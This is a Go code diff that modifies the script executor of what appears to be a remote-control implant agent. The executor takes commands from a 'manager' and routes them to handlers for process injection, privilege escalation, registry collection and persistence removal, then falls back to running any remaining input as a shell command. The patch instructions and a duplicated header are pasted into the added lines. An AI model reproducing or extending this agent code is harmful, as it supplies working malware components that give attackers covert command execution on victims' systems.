@@ -249,9 +249,18 @@ func handleDeploy(d *Deployment) {
 // -----------------------------------------------------------------------------
 // JOCKY script executor
 // -----------------------------------------------------------------------------
+// ─────────────────────────────────────────────────────────────────────────────
+// PATCH: replace the existing executeJOCKYContext function in agent/main.go
+// with this version. Everything else in main.go stays the same.
+// ─────────────────────────────────────────────────────────────────────────────
+
+// -----------------------------------------------------------------------------
+// JOCKY script executor
+// -----------------------------------------------------------------------------
 func executeJOCKYContext(ctx context.Context, script string) string {
 	script = strings.TrimSpace(script)
 
+	// ── 1. Kill switch — always evaluated first ───────────────────────────
 	switch strings.ToLower(script) {
 	case "__exit__", "exit", "kill", "__kill__":
 		fmt.Println("[!] Kill switch. Removing persistence and exiting.")
@@ -260,6 +269,28 @@ func executeJOCKYContext(ctx context.Context, script string) string {
 		os.Exit(0)
 	}
 
+	// ── 2. IR execution ───────────────────────────────────────────────────
+	//
+	// The manager compiles JOCKY source → IRDocument JSON before storing.
+	// IRDocument JSON always starts with '{', so we gate on that to avoid
+	// running json.Unmarshal on every legacy command string.
+	//
+	// If parsing succeeds → dispatch through the typed executor in ir_executor.go.
+	// If parsing fails   → fall through to the legacy string-dispatch below.
+	if strings.HasPrefix(script, "{") {
+		if result, err := executeIRDocumentJSON(script); err == nil {
+			data, jsonErr := json.Marshal(result)
+			if jsonErr == nil {
+				return string(data)
+			}
+			// json.Marshal failing on our own struct is extremely unlikely;
+			// log and fall through so the agent doesn't silently return nothing.
+			fmt.Printf("[!] IR result marshal error: %v\n", jsonErr)
+		}
+		// json.Unmarshal failed → not valid IR JSON → fall through
+	}
+
+	// ── 3. Legacy string dispatch (inject, privesc, exec, registry) ───────
 	if strings.HasPrefix(script, "inject ") {
 		return executeInject(script)
 	}
@@ -277,6 +308,7 @@ func executeJOCKYContext(ctx context.Context, script string) string {
 		return collectRegistry(path)
 	}
 
+	// ── 4. Final fallback: run as shell command ───────────────────────────
 	return runShellCommandContext(ctx, script)
 }
 
